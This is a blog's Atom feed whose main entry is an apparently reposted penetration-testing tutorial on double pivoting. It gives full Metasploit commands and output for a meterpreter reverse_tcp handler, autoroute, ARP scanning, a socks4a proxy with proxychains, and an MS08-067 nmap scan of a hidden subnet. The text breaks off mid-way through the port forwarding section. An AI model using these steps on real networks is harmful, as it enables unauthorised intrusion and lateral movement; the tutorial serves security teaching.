@@ -1,0 +1,855 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://mek.sh/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mek.sh/" rel="alternate" type="text/html" /><updated>2023-06-30T01:44:08+03:00</updated><id>https://mek.sh/feed.xml</id><title type="html">discordia</title><subtitle>cyber security blog about offensive security</subtitle><entry><title type="html">Attack Techniques Against AWS</title><link href="https://mek.sh/blog/attack-techniques-against-aws" rel="alternate" type="text/html" title="Attack Techniques Against AWS" /><published>2023-05-01T18:51:21+03:00</published><updated>2023-05-01T18:51:21+03:00</updated><id>https://mek.sh/blog/attack-techniques-against-aws</id><content type="html" xml:base="https://mek.sh/blog/attack-techniques-against-aws"><![CDATA[<p>:hourglass_flowing_sand: Loading..</p>]]></content><author><name></name></author><category term="network" /><category term="cloud" /><summary type="html"><![CDATA[:hourglass_flowing_sand: Loading..]]></summary></entry><entry><title type="html">Explore Hidden Networks With Double Pivoting</title><link href="https://mek.sh/blog/double-pivoting" rel="alternate" type="text/html" title="Explore Hidden Networks With Double Pivoting" /><published>2016-12-13T18:51:21+03:00</published><updated>2016-12-13T18:51:21+03:00</updated><id>https://mek.sh/blog/double-pivoting</id><content type="html" xml:base="https://mek.sh/blog/double-pivoting"><![CDATA[<p><em>Originally <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">posted on pentest[dot]blog</a> by me in 2016.</em></p>
+
+<p>An n-layered security architecture is created to protect important services required by the concept of <strong>Defense-in-Depth</strong>, which has an important place in the world of information technology.  If we think about this for the corporate networks; critical systems  can not be in the same network with other systems. In this article, we will analyze with examples how the attackers can access the hidden networks that have no accessibility in the first stage, by using pivoting methods.</p>
+
+<h2 id="what-is-routing-">What is Routing ?</h2>
+<p>The process of determining how devices in different networks communicate with each other is called <strong>routing</strong>. Routing is usually performed with devices called “routers”. The routers, routes the network packages to the respective destinations by using the routing table. Routing can be done not only with network devices, such as routers, but also with any computer that has the operating system installed on it.</p>
+
+<p><img src="/assets/images/blog/1.png" alt="" /></p>
+
+<p>According to the example in the above figure,  inorder to successfully communicate between <strong>192.168.1.0/24</strong> and <strong>192.168.10.0/24</strong> networks requires a routing table record. According to the rule defined in the router, access is made from “192.168.1.0/24 source to 192.168.10.0/24 destination”.</p>
+
+<p>Adventure of a network package is as follow:</p>
+<ol>
+  <li>Is the IP address to be accessed on the local network?
+    <ul>
+      <li>If so, reach the destination.</li>
+      <li>If not, send it to the gateway.</li>
+    </ul>
+  </li>
+  <li>Once the router receives the package, it looks at its own routing table
+    <ul>
+      <li>Do I have a routing rule for the destination IP address or the destination network?
+        <ul>
+          <li>If yes, route the package to the destination.</li>
+          <li>If not, send to gateway.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>The same process is repeated in other routers.</li>
+  <li>The package finally arrives to the router responsible for the internet exit of the institution. And the package is sent to the internet</li>
+</ol>
+
+<h2 id="what-is-pivoting-">What is Pivoting ?</h2>
+
+<p><img src="/assets/images/blog/2.gif" alt="" /></p>
+
+<p>Basically, it is the process of accessing networks that we do not have access to under normal circumstances by using compromised computers. Network isolation will be useless in case of compromise a computer that has a access to the multiple. With this method, an attacker who performs routing on the compromised systems can access the hidden networks. Every request to be made to the newly discovered network is transmitted over the Pivot. It’s like a kind of tunnel.</p>
+
+<p><img src="/assets/images/blog/3.png" alt="" /></p>
+
+<p>As seen in the above topology, the device that has two NICs has access to the both <strong>192.168.1.0/24</strong> and <strong>192.168.10.0/24</strong> networks. Under normal circumstances there is no access between these two networks -unless a routing rule is defined. According to this structure, the authorized user, who is using the computer with two NIC cards, has to access some services in the DMZ.</p>
+
+<h2 id="compromise-first-pivot-and-port-forwarding">Compromise First Pivot and Port Forwarding</h2>
+
+<p>According to our attack scenario, meterpreter shell obtained in the system named as RD is also connected to the DMZ network. Later, it is determined that the target has two NICs with the information gathering process.</p>
+
+<p><strong>Note:</strong> The router in the environment does not route between networks.</p>
+
+<p><img src="/assets/images/blog/4.png" alt="" /></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span> 
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">payload</span> <span class="o">=&gt;</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="no">LHOST</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span> 
+<span class="no">LHOST</span> <span class="o">=&gt;</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="no">LPORT</span> <span class="mi">1234</span>
+<span class="no">LPORT</span> <span class="o">=&gt;</span> <span class="mi">1234</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Started</span> <span class="n">reverse</span> <span class="no">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1234</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Starting</span> <span class="n">the</span> <span class="n">payload</span> <span class="n">handler</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">957487</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Meterpreter</span> <span class="n">session</span> <span class="mi">2</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1234</span> <span class="o">-&gt;</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span><span class="p">:</span><span class="mi">49162</span><span class="p">)</span>
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">ifconfig</span>
+
+<span class="no">Interface</span>  <span class="mi">1</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Software</span> <span class="no">Loopback</span> <span class="no">Interface</span> <span class="mi">1</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">4294967295</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.0</span><span class="o">.</span><span class="mf">0.0</span>
+<span class="no">IPv6</span> <span class="no">Address</span> <span class="p">:</span> <span class="o">::</span><span class="mi">1</span>
+<span class="no">IPv6</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="n">ffff</span><span class="ss">:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span>
+
+
+<span class="no">Interface</span> <span class="mi">11</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="ss">:e1</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="ss">:af</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+
+
+
+<span class="no">Interface</span> <span class="mi">19</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span> <span class="c1">#2</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">7</span><span class="n">f</span><span class="p">:</span><span class="mi">3</span><span class="n">c</span><span class="ss">:fe</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.11</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+</code></pre></div></div>
+
+<p>According to our scenario, the attacker who gains access to the <strong>RD</strong> system will want to access the network with the second NIC (7.7.7.0/24). The attacker must first define the routing rule on RD to do this operation.</p>
+
+<p>It is quite easy to do this with Metasploit. The following command can be used to create the routing rule via the current meterpreter session.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">s</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span><span class="o">/</span><span class="mi">24</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Adding</span> <span class="n">a</span> <span class="n">route</span> <span class="n">to</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span><span class="o">/</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Added</span> <span class="n">route</span> <span class="n">to</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span><span class="o">/</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="n">via</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Use</span> <span class="n">the</span> <span class="o">-</span><span class="nb">p</span> <span class="n">option</span> <span class="n">to</span> <span class="n">list</span> <span class="n">all</span> <span class="n">active</span> <span class="n">routes</span>
+<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="nb">p</span>
+
+<span class="no">Active</span> <span class="no">Routing</span> <span class="no">Table</span>
+<span class="o">====================</span>
+
+ <span class="no">Subnet</span> <span class="no">Netmask</span> <span class="no">Gateway</span>
+ <span class="o">------</span> <span class="o">-------</span> <span class="o">-------</span>
+ <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="no">Session</span> <span class="mi">2</span>
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>According to the defined rule; As long as the meterpreter session with ID value 2 is running, the 7.7.7.0/24 network can be accessed in the Metasploit Framework.</p>
+
+<p>After this step, the IP addresses of the JC system is detected using post modules such as <strong>arp_scanner</strong>. JC is another computer found in hidden network -7.7.7.20-</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">arp_scanner</span> <span class="no">RHOSTS</span><span class="o">=</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span><span class="o">/</span><span class="mi">24</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Running</span> <span class="k">module</span> <span class="nn">against</span> <span class="no">DISCORDIA</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">ARP</span> <span class="no">Scanning</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span><span class="o">/</span><span class="mi">24</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="no">IP</span><span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.11</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">7</span><span class="n">f</span><span class="p">:</span><span class="mi">3</span><span class="n">c</span><span class="ss">:fe</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="no">IP</span>  <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.12</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="ss">:b2:c1</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">CIMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="no">IP</span><span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="ss">:fa:a0:c5</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="no">IP</span><span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.255</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="ss">:b5</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p><img src="/assets/images/blog/5.png" alt="" /></p>
+
+<p>Naturally, the following question will come to mind; Post modules such as arp_scanner may be insufficient for such scanning work, can <strong>nmap</strong> style scanning tools be used?</p>
+
+<h2 id="nmap-via-pivoting">Nmap via Pivoting</h2>
+
+<p>In order to do this, the routing configuration must be active on Metasploit, and this configuration must also be able to be forwarded via socks4 proxy. There is another metasploit module that also meets this need.</p>
+
+<p>Use of socks4 proxy as metasploit module:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">background</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Backgrounding</span> <span class="n">session</span> <span class="mi">2</span><span class="o">...</span>
+<span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">socks4a</span> 
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">socks4a</span><span class="p">):</span>
+
+   <span class="no">Name</span>     <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">SRVHOST</span>  <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>          <span class="n">yes</span>       <span class="no">The</span> <span class="n">address</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span>
+   <span class="no">SRVPORT</span>  <span class="mi">1080</span>             <span class="n">yes</span>       <span class="no">The</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+
+
+<span class="no">Auxiliary</span> <span class="ss">action:
+
+   </span><span class="no">Name</span>   <span class="no">Description</span>
+   <span class="o">----</span>   <span class="o">-----------</span>
+   <span class="no">Proxy</span>  
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">srvhost</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span>
+<span class="n">srvhost</span> <span class="o">=&gt;</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span>
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Auxiliary</span> <span class="k">module</span> <span class="nn">execution</span> <span class="n">completed</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Starting</span> <span class="n">the</span> <span class="n">socks4a</span> <span class="n">proxy</span> <span class="n">server</span>
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">netstat</span> <span class="o">-</span><span class="n">antp</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">1080</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="ss">exec: </span><span class="n">netstat</span> <span class="o">-</span><span class="n">antp</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">1080</span>
+
+<span class="n">tcp</span>        <span class="mi">0</span>      <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span>            <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="no">LISTEN</span>      <span class="mi">3626</span><span class="o">/</span><span class="n">ruby</span>       
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p>With the <strong>ProxyChains</strong> tool developed for GNU\Linux operating systems, any TCP connection can be routed to destinations via TOR or SOCKS4, SOCKS5, HTTP / HTTPS. Multiple proxy servers can be used in this tunneling technique. In addition to providing anonymity, applications such as pivoting can also be used to direct traffic to new networks discovered.</p>
+
+<p>In the last line of the file /etc/proxychains.conf opened with a text editor, the information of the newly created socks4 proxy server is entered.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span> <span class="n">snippet</span> <span class="o">---</span>
+
+<span class="p">[</span><span class="no">ProxyList</span><span class="p">]</span>
+<span class="c1"># add proxy here ...</span>
+<span class="c1"># meanwile</span>
+<span class="c1"># defaults set to "tor"</span>
+<span class="c1">#socks4  127.0.0.1 9050</span>
+<span class="n">socks4</span>  <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span> <span class="mi">1080</span>
+</code></pre></div></div>
+
+<p>Performing a nmap scan with proxychains is a simple process. Network packages will be delivered to the destination via the defined proxy.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,135,139,445 <span class="nt">--script</span><span class="o">=</span>smb-vuln-ms08-067.nse 7.7.7.20
+ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+
+Starting Nmap 7.25BETA1 <span class="o">(</span> https://nmap.org <span class="o">)</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:445-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:80-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:135-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:22-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:139-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:22-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:135-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:139-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:445-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:139-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:135-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-7</span>.7.7.20:445-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Nmap scan report <span class="k">for </span>7.7.7.20
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          Bitvise WinSSHD 7.16 <span class="o">(</span>FlowSsh 7.15<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
+135/tcp  open     msrpc        Microsoft Windows RPC
+139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs: CVE:CVE-2008-4250
+|          The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
+|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
+|          code via a crafted RPC request that triggers the overflow during path canonicalization.
+| 
+|     Disclosure <span class="nb">date</span>: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.51 seconds
+root@kali:~#
+</code></pre></div></div>
+
+<p>Based on the scan results, there are SSH and HTTP services that will work on the target system. Before going further with exploitation, we will cover a another technique for traffic routing called as port forwarding.</p>
+
+<h2 id="port-forwarding">Port Forwarding</h2>
+
+<p>Port forwarding is one of the basic steps of pivoting. Direct access to certain services running on discovered systems on the hidden network may not be available (web servers, etc.). This is because there is no double sided routing. We know how to reach the target system and make a request, but our requests will fail because the target does not know how to reach us.</p>
+
+<p><img src="/assets/images/blog/7.png" alt="" /></p>
+
+<p>For this reason, we route a port on our own system to the destination via the defined meterpreter session. The routing will work as long as this process is alive.</p>
+
+<p>There is one important point to be noted at this point, the routing we provide with the <strong>run autoroute</strong> command gives us the freedom to work in the Metasploit Framework. But when we try to reach the target with a Kali tools, we need tools like port forwarding or proxychains.</p>
+
+<p>Port forwarding can be done with <strong>portfwd</strong> module which is one of the post modules of Metasploit.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">portfwd</span> <span class="o">-</span><span class="n">h</span>
+<span class="no">Usage</span><span class="p">:</span> <span class="n">portfwd</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">add</span> <span class="o">|</span> <span class="n">delete</span> <span class="o">|</span> <span class="n">list</span> <span class="o">|</span> <span class="n">flush</span><span class="p">]</span> <span class="p">[</span><span class="n">args</span><span class="p">]</span>
+
+
+<span class="no">OPTIONS</span><span class="p">:</span>
+
+    <span class="o">-</span><span class="no">L</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="no">Forward</span><span class="p">:</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="p">(</span><span class="n">optional</span><span class="p">)</span><span class="o">.</span> <span class="no">Remote</span><span class="p">:</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span><span class="p">.</span>
+    <span class="nf">-</span><span class="no">R</span>        <span class="no">Indicates</span> <span class="n">a</span> <span class="n">reverse</span> <span class="n">port</span> <span class="n">forward</span><span class="p">.</span>
+    <span class="nf">-</span><span class="n">h</span>        <span class="no">Help</span> <span class="n">banner</span><span class="p">.</span>
+    <span class="nf">-</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="no">Index</span> <span class="n">of</span> <span class="n">the</span> <span class="n">port</span> <span class="n">forward</span> <span class="n">entry</span> <span class="n">to</span> <span class="n">interact</span> <span class="n">with</span> <span class="p">(</span><span class="n">see</span> <span class="n">the</span> <span class="s2">"list"</span> <span class="n">command</span><span class="p">).</span>
+    <span class="nf">-</span><span class="n">l</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="no">Forward</span><span class="p">:</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="no">Reverse</span><span class="p">:</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span><span class="p">.</span>
